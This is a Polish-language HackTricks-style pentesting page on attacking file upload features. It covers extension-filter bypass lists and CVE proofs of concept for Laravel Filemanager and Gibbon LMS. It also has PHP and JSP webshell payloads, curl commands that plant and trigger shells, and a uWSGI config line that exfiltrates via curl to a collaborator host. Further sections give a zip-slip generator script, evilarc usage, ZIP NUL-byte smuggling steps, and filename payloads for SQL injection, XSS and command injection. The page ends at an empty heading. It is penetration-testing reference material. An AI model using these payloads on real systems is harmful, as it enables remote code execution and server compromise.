# Przesyłanie plików

{{#include ../../banners/hacktricks-training.md}}

## Ogólna metodologia przesyłania plików

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Omijanie kontroli rozszerzeń plików

1. Jeśli mają zastosowanie, **sprawdź** **wcześniejsze rozszerzenia.** Przetestuj je także używając **wielkich liter**: _pHp, .pHP5, .PhAr ..._
2. _Sprawdź **dodanie poprawnego rozszerzenia przed** rozszerzeniem wykonawczym (użyj też wcześniejszych rozszerzeń):_
- _file.png.php_
- _file.png.Php5_
3. Spróbuj dodać **znaki specjalne na końcu.** Możesz użyć Burp do **bruteforce** wszystkich znaków **ascii** i **Unicode**. (_Zauważ, że możesz też próbować użyć **wcześniej** wspomnianych **rozszerzeń**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Spróbuj obejść zabezpieczenia **oszukując parser rozszerzeń** po stronie serwera technikami takimi jak **doubling** rozszerzenia lub **dodawanie śmieciowych** danych (**null** bytes) między rozszerzeniami. _Możesz też użyć **wcześniej wymienionych** rozszerzeń, aby przygotować lepszy ładunek._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodaj **kolejną warstwę rozszerzeń** do wcześniejszego sprawdzenia:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Spróbuj umieścić **exec extension before the valid extension** i miej nadzieję, że serwer jest źle skonfigurowany. (useful to exploit Apache misconfigurations where anything with extension** _**.php**_**, but** not necessarily ending in .php** will execute code):
- _ex: file.php.png_
7. Użycie **NTFS alternate data stream (ADS)** w **Windows**. W tym przypadku po zabronionym rozszerzeniu i przed dozwolonym zostanie wstawiony znak dwukropka ":”. W rezultacie na serwerze zostanie utworzony **pusty plik z zabronionym rozszerzeniem** (np. "file.asax:.jpg”). Ten plik może być później modyfikowany przy użyciu innych technik, takich jak użycie jego krótkiej nazwy pliku. Wzorzec "**::$data**” może być również użyty do tworzenia plików niepustych. Dlatego dodanie kropki po tym wzorcu może być również przydatne do obejścia dalszych ograniczeń (np. "file.asp::$data.”)
8. Spróbuj przekroczyć limity długości nazwy pliku. Poprawne rozszerzenie zostaje obcięte. A złośliwy PHP zostaje. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Niektóre upload handlery obcinają lub normalizują końcowe znaki kropki w zapisanej nazwie pliku. W UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) w wersjach przed 2.9.1 można obejść walidację rozszerzeń poprzez:

- Użycie poprawnego MIME obrazka i nagłówka magic (np. PNG’s `\x89PNG\r\n\x1a\n`).
- Nazwanie przesyłanego pliku rozszerzeniem PHP, po którym występuje kropka, np. `shell.php.`.
- Serwer usuwa końcową kropkę i zapisuje `shell.php`, który zostanie wykonany, jeśli zostanie umieszczony w katalogu obsługiwanym przez web (domyślny public storage jak `/storage/files/`).

Minimalny PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Następnie odwiedź zapisaną ścieżkę (typowe w Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Omijanie Content-Type, Magic Number, kompresji i zmiany rozmiaru

- Omijaj sprawdzanie **Content-Type** ustawiając **value** nagłówka **Content-Type** na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Omijaj sprawdzanie **magic number** przez dodanie na początku pliku **bajtów prawdziwego obrazu** (w celu zmylenia polecenia _file_). Lub umieść shell w **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` lub możesz także **wprowadzić payload bezpośrednio** w obrazie:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Jeśli do twojego obrazu dodawana jest **kompresja**, na przykład przy użyciu standardowych bibliotek PHP takich jak [PHP-GD](https://www.php.net/manual/fr/book.image.php), poprzednie techniki nie będą w tym pomocne. Możesz jednak użyć **PLTE chunk** [**techniki opisanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Strona może też **zmieniać rozmiar** **obrazu**, używając na przykład funkcji PHP-GD `imagecopyresized` lub `imagecopyresampled`. Możesz jednak użyć **IDAT chunk** [**techniki opisanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Kolejna technika tworzenia payloadu, który **przetrwa zmianę rozmiaru** obrazu, wykorzystuje funkcję PHP-GD `thumbnailImage`. Możesz jednak użyć **tEXt chunk** [**techniki opisanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Inne triki do sprawdzenia

- Znajdź podatność pozwalającą **zmienić nazwę** już przesłanego pliku (aby zmienić rozszerzenie).
- Znajdź podatność **Local File Inclusion** aby uruchomić backdoor.
- **Possible Information disclosure**:
1. Prześlij **wielokrotnie** (i w **tym samym czasie**) **ten sam plik** o **tej samej nazwie**
2. Prześlij plik o **nazwie** pliku lub **folderu**, który **już istnieje**
3. Przesyłanie pliku o nazwie **"." , "..", or "…"**. Na przykład, w Apache na **Windows**, jeśli aplikacja zapisuje przesłane pliki w katalogu "/www/uploads/", nazwa pliku "." stworzy plik o nazwie
uploads” w katalogu "/www/".
4. Prześlij plik, który może być trudny do usunięcia, taki jak **"…:.jpg"** w **NTFS**. (Windows)
5. Prześlij plik w **Windows** z **nieprawidłowymi znakami** takimi jak `|<>*?”` w jego nazwie. (Windows)
6. Prześlij plik w **Windows** używając zarezerwowanych (**zakazanych**) nazw takich jak CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Spróbuj też **przesłać plik wykonywalny** (.exe) lub **.html** (mniej podejrzany), który **wykona kod** po przypadkowym otwarciu przez ofiarę.

### Specjalne sztuczki z rozszerzeniami

Jeśli próbujesz przesyłać pliki na **PHP server**, [zobacz sztuczkę z **.htaccess** aby wykonać kod](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Jeśli próbujesz przesyłać pliki na **ASP server**, [zobacz sztuczkę z **.config** aby wykonać kod](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Pliki `.phar` są jak `.jar` dla Java, ale dla php, i mogą być **używane jak plik php** (wykonywane przez php, lub dołączane w skrypcie...).

Rozszerzenie `.inc` jest czasami używane dla plików php, które służą tylko do **importu plików**, więc w pewnym momencie ktoś mógł dopuścić **wykonywanie tego rozszerzenia**.

## **Jetty RCE**

Jeśli możesz przesłać plik XML na serwer Jetty, możesz uzyskać [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Zgodnie z tym, co pokazano na poniższym obrazie, prześlij plik XML do `$JETTY_BASE/webapps/` i oczekuj shell'a!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Rozważ następujący przykład złośliwego pliku `uwsgi.ini`, pokazujący różne schematy:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Wykonanie payload następuje podczas parsowania pliku konfiguracyjnego. Aby konfiguracja została aktywowana i sparsowana, proces uWSGI musi zostać albo zrestartowany (potencjalnie po awarii lub w wyniku Denial of Service), albo plik musi mieć włączony auto-reload. Funkcja auto-reload, jeśli jest włączona, przeładowuje plik w określonych odstępach po wykryciu zmian.

Kluczowe jest zrozumienie luźnego charakteru parsowania plików konfiguracyjnych uWSGI. Konkretnie, omawiany payload może zostać wstawiony do pliku binarnego (takiego jak obraz lub PDF), co dodatkowo rozszerza zakres możliwej eksploatacji.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Niezautoryzowany endpoint w Gibbon LMS umożliwia arbitrary file write wewnątrz web root, prowadząc do pre-auth RCE przez upuszczenie pliku PHP. Wersje podatne: do i włącznie 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Wymagane parametry:
- `img`: data-URI-like string: `[mime];[name],[base64]` (serwer ignoruje type/name, base64 dekoduje końcówkę)
- `path`: nazwa pliku docelowego względem katalogu instalacyjnego Gibbon (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: akceptowana jest dowolna niepusta wartość (e.g., `0000000001`)

Minimalny PoC do zapisania i odczytania pliku:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Wrzucić minimalny webshell i wykonywać polecenia:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notatki:
- Handler wykonuje `base64_decode($_POST["img"])` po rozdzieleniu przez `;` i `,`, następnie zapisuje bajty do `$absolutePath . '/' . $_POST['path']` bez walidacji rozszerzenia/typu.
- W wyniku kod uruchamia się jako użytkownik usługi webowej (np. XAMPP Apache on Windows).

Referencje dla tego buga obejmują usd HeroLab advisory i wpis w NVD. Zobacz sekcję References poniżej.

## **wget File Upload/SSRF Trick**

W niektórych przypadkach możesz stwierdzić, że serwer używa **`wget`** do **pobierania plików** i możesz **wskazać** **URL**. W takich przypadkach kod może sprawdzać, czy rozszerzenie pobranych plików znajduje się na whitelist, aby upewnić się, że pobierane będą tylko dozwolone pliki. Jednak **ten mechanizm można obejść.**

Maksymalna długość **nazwy pliku** w **linux** to **255**, jednak **wget** obcina nazwy plików do **236** znaków. Możesz **pobrać plik o nazwie "A"*232+".php"+".gif"**, ta nazwa pliku **obejdzie** **sprawdzenie** (w tym przykładzie **".gif"** jest **dozwolonym** rozszerzeniem), ale `wget` **zmieni nazwę** pliku na **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Zauważ, że **inną opcją**, o której możesz myśleć, by obejść to sprawdzenie, jest spowodowanie, aby **serwer HTTP przekierował do innego pliku**, więc początkowy URL ominie sprawdzenie, a następnie wget pobierze przekierowany plik pod nową nazwą. To **nie zadziała** **chyba że** wget jest używany z **parametrem** `--trust-server-names`, ponieważ **wget pobierze przekierowaną stronę pod nazwą pliku wskazaną w oryginalnym URL**.

### Omijanie upload directory za pomocą NTFS junctions (Windows)

(Do tego ataku będziesz potrzebować local access do maszyny Windows) Gdy uploads są przechowywane w per-user subfolders na Windows (np. C:\Windows\Tasks\Uploads\<id>\) i kontrolujesz tworzenie/usuwanie tego podkatalogu, możesz zastąpić go directory junction wskazującym na wrażliwe miejsce (np. webroot). Kolejne uploads zostaną zapisane w docelowej ścieżce, umożliwiając wykonanie kodu jeśli cel interpretuje server-side code.

Przykładowy przebieg przekierowania uploads do XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Uwagi
- mklink /J creates an NTFS directory junction (reparse point). Konto serwera WWW musi podążać za junction i mieć uprawnienia zapisu w miejscu docelowym.
- To przekierowuje dowolne zapisy plików; jeśli miejsce docelowe wykonuje skrypty (PHP/ASP), prowadzi to do RCE.
- Obrona: nie pozwalaj, aby zapisywalne katalogi uploadów były kontrolowane przez atakującego pod C:\Windows\Tasks lub podobnymi; blokuj junction creation; waliduj rozszerzenia po stronie serwera; przechowuj uploady na oddzielnym woluminie lub z deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Niektóre upload/ingest handlers zapisują surowe body żądania na ścieżce systemu plików, która jest skonstruowana z parametrów zapytania kontrolowanych przez użytkownika. Jeśli handler obsługuje również Content-Encoding: gzip i nie kanonizuje/waliduje ścieżki destination, możesz połączyć directory traversal ze skompresowanym gzip payloadem, aby zapisać dowolne bajty do katalogu serwowanego przez web i uzyskać RCE (np. upuścić JSP w webapps Tomcata).

Ogólny przebieg eksploatacji:
- Przygotuj swój server-side payload (np. minimalny JSP webshell) i gzip-skompresuj bajty.
- Wyślij POST, w którym parametr ścieżki (np. token) zawiera traversal pozwalający wydostać się z zamierzonego folderu, a file wskazuje nazwę pliku do zapisania. Ustaw Content-Type: application/octet-stream i Content-Encoding: gzip; body to skompresowany payload.
- Odwiedź zapisany plik, aby wywołać wykonanie.

Ilustracyjne żądanie:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Następnie uruchom:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notatki
- Ścieżki docelowe różnią się w zależności od instalacji (np. /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ w niektórych stackach). Każdy web-exposed folder, który wykonuje JSP, będzie działać.
- Burp Suite’s Hackvertor extension może wygenerować poprawne gzip body z Twojego payloadu.
- To czysty wzorzec pre-auth arbitrary file write → RCE; nie opiera się na multipart parsing.

Środki zaradcze
- Derive upload destinations server-side; never trust path fragments from clients.
- Kanoniczuj i wymuszaj, aby rozwiązywana ścieżka pozostawała w obrębie dozwolonego (allow-listed) katalogu bazowego.
- Przechowuj uploads na nie-wykonywalnym wolumenie i zabroń wykonywania skryptów z zapisywalnych ścieżek.

## Narzędzia

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) to potężne narzędzie zaprojektowane, aby wspierać Pentesters i Bug Hunters w testowaniu mechanizmów uploadu plików. Wykorzystuje różne bug bounty techniques, aby uprościć proces identyfikacji i eksploatacji podatności, zapewniając gruntowne oceny aplikacji webowych.

### Corrupting upload indices with snprintf quirks (historical)

Niektóre legacy upload handlers, które używają `snprintf()` lub podobnych do budowania multi-file arrays z jednego uploadu, mogą zostać oszukane do sfabrykowania struktury `_FILES`. Z powodu niespójności i obcinania w zachowaniu `snprintf()`, starannie przygotowany pojedynczy upload może wyglądać jak wiele indeksowanych plików po stronie serwera, myląc logikę zakładającą ścisły kształt (np. traktując to jako multi-file upload i wybierając niebezpieczne ścieżki). Choć dziś to niszowe, wzorzec „index corruption” od czasu do czasu pojawia się w CTFs i starszych bazach kodu.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antywirus**
- Sprawdź, czy istnieje jakiś **limit rozmiaru** przy uploadowaniu plików

Oto lista top 10 rzeczy, które możesz osiągnąć przez upload plików (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magiczne bajty nagłówka

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Zobacz [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) dla innych typów plików.

## Automatyczne dekompresowanie uploadowanego pliku Zip/Tar

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Wgraj archiwum zawierające soft links do innych plików; następnie, uzyskując dostęp do zdekompresowanych plików, uzyskasz dostęp do linkowanych plików:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Rozpakowywanie do różnych folderów

Nieoczekiwane tworzenie plików w katalogach podczas dekompresji jest poważnym problemem. Pomimo początkowych założeń, że takie ustawienie może chronić przed OS-level command execution poprzez złośliwe uploady plików, obsługa hierarchicznej kompresji i możliwości directory traversal formatu archiwum ZIP mogą zostać wykorzystane. Pozwala to atakującym na obejście ograniczeń i wydostanie się z bezpiecznych katalogów uploadu poprzez manipulowanie funkcją dekompresji docelowej aplikacji.

An automated exploit do tworzenia takich plików jest dostępny na [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Narzędzie można użyć w następujący sposób:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatkowo, **symlink trick with evilarc** jest opcją. Jeśli celem jest zaatakowanie pliku takiego jak `/flag.txt`, w systemie należy utworzyć do niego symlink. To zapewnia, że evilarc nie napotka błędów podczas działania.

Poniżej znajduje się przykład kodu Python używanego do utworzenia złośliwego pliku zip:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Aby uzyskać więcej szczegółów **zobacz oryginalny post**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Kod PHP jest napisany tak, aby wykonywał polecenia przekazywane przez zmienną `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Tworzone jest wiele plików, a następnie składane archiwum zip zawierające te pliki.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Nazwy plików wewnątrz zip są zmieniane przy pomocy vi lub edytora hex, zastępując "xxA" przez "../" w celu przejścia między katalogami.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Kiedy backend waliduje wpisy ZIP za pomocą PHP’s ZipArchive, ale ekstrakcja zapisuje na filesystem używając surowych nazw, możesz przemycić niedozwolone rozszerzenie przez wstawienie NUL (0x00) do pól nazwy pliku. ZipArchive traktuje nazwę wpisu jako C‑string i obcina ją przy pierwszym NUL; filesystem zapisuje pełną nazwę, pomijając wszystko po NUL.

High-level flow:
- Przygotuj prawidłowy plik kontenerowy (np. valid PDF), który osadza mały PHP stub w strumieniu tak, aby magic/MIME pozostało PDF.
- Nazwij go np. `shell.php..pdf`, zip it, then hex‑edit the ZIP local header and central directory filename to replace the first `.` after `.php` with `0x00`, resulting in `shell.php\x00.pdf`.
- Validators that rely on ZipArchive will “see” `shell.php .pdf` and allow it; the extractor writes `shell.php` to disk, leading to RCE if the upload folder is executable.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Uwagi
- Zmień OBA wystąpienia nazwy pliku (lokalne i central directory). Niektóre narzędzia dodają dodatkowy data descriptor entry – dostosuj wszystkie pola nazwy, jeśli występują.
- Plik payload musi nadal przejść server‑side magic/MIME sniffing. Osadzenie PHP w strumieniu PDF zachowuje prawidłowy nagłówek.
- Działa tam, gdzie ścieżka enum/validation i ścieżka extraction/write różnią się w obsłudze ciągów znaków.

### Stacked/concatenated ZIPs (rozbieżność parserów)

